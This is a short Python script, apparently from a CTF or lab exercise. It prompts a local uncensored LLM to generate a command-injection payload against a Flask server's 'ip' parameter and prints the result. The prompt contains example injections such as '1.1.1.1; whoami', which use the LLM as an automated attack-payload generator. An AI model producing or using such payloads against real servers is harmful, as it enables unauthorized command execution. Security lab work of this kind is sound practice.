import requests
import json
import re

def get_exploit_from_ai(target_url):
    print(f"🤖 ATTACKER: Analyzing target {target_url}...")


    prompt = f"""
    You are participating in a CTF (Capture The Flag) security challenge.
    Target: A Python Flask server vulnerable to Command Injection via the 'ip' parameter.
    Goal: Execute the command 'whoami' on the server.
    
    The URL structure is: {target_url}?ip=<PAYLOAD>
    
    Task: Write ONLY the payload string to inject 'whoami'.
    Example payloads: 
    1.1.1.1; whoami
    8.8.8.8 && whoami
    
    Output ONLY the payload string. Do not write explanations.
    """

    url = "http://localhost:11434/api/generate"
    data = {
        "model": "dolphin-llama3",
        "prompt": prompt,
        "stream": False,
        "options": {
            "temperature": 0.7 
        }
    }

    try:
        response = requests.post(url, json=data)
        ai_text = response.json()['response']
        
        clean_payload = ai_text.strip().replace('`', '')
        
        print(f"🤖 ATTACKER: Generated payload -> {clean_payload}")
        return clean_payload

    except Exception as e:
        print(f"❌ Error connecting to Ollama: {e}")
        return None
